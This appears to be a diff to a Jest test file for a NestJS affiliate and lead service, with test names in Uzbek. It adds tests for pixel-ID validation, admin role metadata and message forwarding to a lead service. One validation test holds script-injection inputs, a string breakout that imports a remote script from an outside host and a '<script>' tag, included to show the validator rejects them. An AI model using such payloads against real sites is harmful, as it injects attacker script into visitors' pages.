@@ -14,8 +14,13 @@ import {
   LeadPreviousDto,
   LeadPriceDto,
   OperatorLeadListItemDto,
+  Role,
+  ROLES_KEY,
+  UpdateAffiliateStreamDto,
 } from '@app/common';
+import { of } from 'rxjs';
 import { AdminLeadsController } from './admin-leads.controller';
+import { AdminOfferContentController } from './admin-offer-content.controller';
 import { AffiliateStreamsController } from './affiliate-streams.controller';
 import { ParseLeadIdPipe } from './lead-id.pipe';
 import { NOT_IMPLEMENTED } from './lead-stub';
@@ -142,6 +147,35 @@ describe('Lid shartnomasi (BE-25)', () => {
     ).resolves.toEqual(['productId', 'operatorId']);
   });
 
+  it('piksel ID: faqat raqam (Meta) va lotin harf/raqam (TikTok) — sahifaga skript kiritib bo‘lmaydi', async () => {
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: "1');import('//x.io/a.js');('",
+      }),
+    ).resolves.toEqual(['metaPixelId']);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, { tiktokPixelId: 'C4AB<script>' }),
+    ).resolves.toEqual(['tiktokPixelId']);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: '1234567890',
+        tiktokPixelId: 'C4ABC123XYZ',
+      }),
+    ).resolves.toEqual([]);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: '',
+        tiktokPixelId: '',
+      }),
+    ).resolves.toEqual([]);
+  });
+
+  it('admin offer matnlari faqat ADMIN va SUPERADMIN uchun', () => {
+    expect(Reflect.getMetadata(ROLES_KEY, AdminOfferContentController)).toEqual(
+      [Role.ADMIN, Role.SUPERADMIN],
+    );
+  });
+
   it('telefon faqat +998 va 9 raqam', async () => {
     await expect(
       errorsOf({ ...validLead, phone: '+99890123' }),
@@ -204,19 +238,14 @@ describe('Lid shartnomasi (BE-25)', () => {
   });
 
   it('stublar 501 va NOT_IMPLEMENTED qaytaradi, kartasini aytadi', async () => {
-    const pub = new PublicLeadsController();
-    await expect501(() => pub.getLandingPage('k7Qm2x'), 'BE-11');
-    await expect501(() => pub.createClick({ code: 'k7Qm2x' }), 'BE-11');
+    const lead = { send: jest.fn() } as never;
+    const pub = new PublicLeadsController(lead);
     await expect501(
       () => pub.createLead(validLead as unknown as CreateLeadDto),
       'BE-12',
     );
 
-    const aff = new AffiliateStreamsController();
-    await expect501(() => aff.listOffers({}), 'BE-11');
-    await expect501(() => aff.createStream({ productId: '501' }), 'BE-11');
-    await expect501(() => aff.listStreams({}), 'BE-11');
-    await expect501(() => aff.updateStream('3301', {}), 'BE-11');
+    const aff = new AffiliateStreamsController(lead);
     await expect501(
       () => aff.stats({ from: '2026-12-01', to: '2026-12-31' }),
       'BE-28',
@@ -249,5 +278,74 @@ describe('Lid shartnomasi (BE-25)', () => {
     const admin = new AdminLeadsController();
     await expect501(() => admin.list({}), 'BE-42');
     await expect501(() => admin.getCard('7001'), 'BE-42');
+  });
+
+  describe('BE-11: endpointlar lead-service ga boradi', () => {
+    const make = () => {
+      const send = jest.fn(() => of({ ok: true }));
+      return { send, client: { send } as never };
+    };
+
+    it('ochiq sahifa va klik: kod, IP va user agent bilan', async () => {
+      const { send, client } = make();
+      const pub = new PublicLeadsController(client);
+      await pub.getLandingPage('k7Qm2x');
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.landing.get' },
+        { code: 'k7Qm2x' },
+      );
+      await pub.createClick(
+        { code: 'k7Qm2x', variant: 's3', sub1: 'a' } as never,
+        '203.0.113.7',
+        'Mozilla/5.0',
+      );
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.click.create' },
+        {
+          click: { code: 'k7Qm2x', variant: 's3', sub1: 'a' },
+          ip: '203.0.113.7',
+          userAgent: 'Mozilla/5.0',
+        },
+      );
+    });
+
+    it('sotuvchi: sotuvchi ID si tokendan, so‘rovdan emas (SOT-3)', async () => {
+      const { send, client } = make();
+      const aff = new AffiliateStreamsController(client);
+      await aff.createStream('77', { productId: '501' });
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.stream.create' },
+        { affiliateId: '77', productId: '501' },
+      );
+      await aff.listStreams('77', { page: 2, limit: 10 });
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.stream.list' },
+        { affiliateId: '77', page: 2, limit: 10 },
+      );
+      await aff.updateStream('77', '3301', { salePrice: 262000 });
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.stream.update' },
+        { affiliateId: '77', streamId: '3301', patch: { salePrice: 262000 } },
+      );
+      await aff.listOffers({ minApproveRate: 50 });
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.offer.list' },
+        { query: { minApproveRate: 50 } },
+      );
+    });
+
+    it('admin offer matnlari: kim saqlagani tokendan', async () => {
+      const { send, client } = make();
+      const admin = new AdminOfferContentController(client);
+      await admin.update('1', '501', { highlights: ['a'], boxContents: [] });
+      expect(send).toHaveBeenLastCalledWith(
+        { cmd: 'lead.offer-content.update' },
+        {
+          productId: '501',
+          actorId: '1',
+          content: { highlights: ['a'], boxContents: [] },
+        },
+      );
+    });
   });
 });
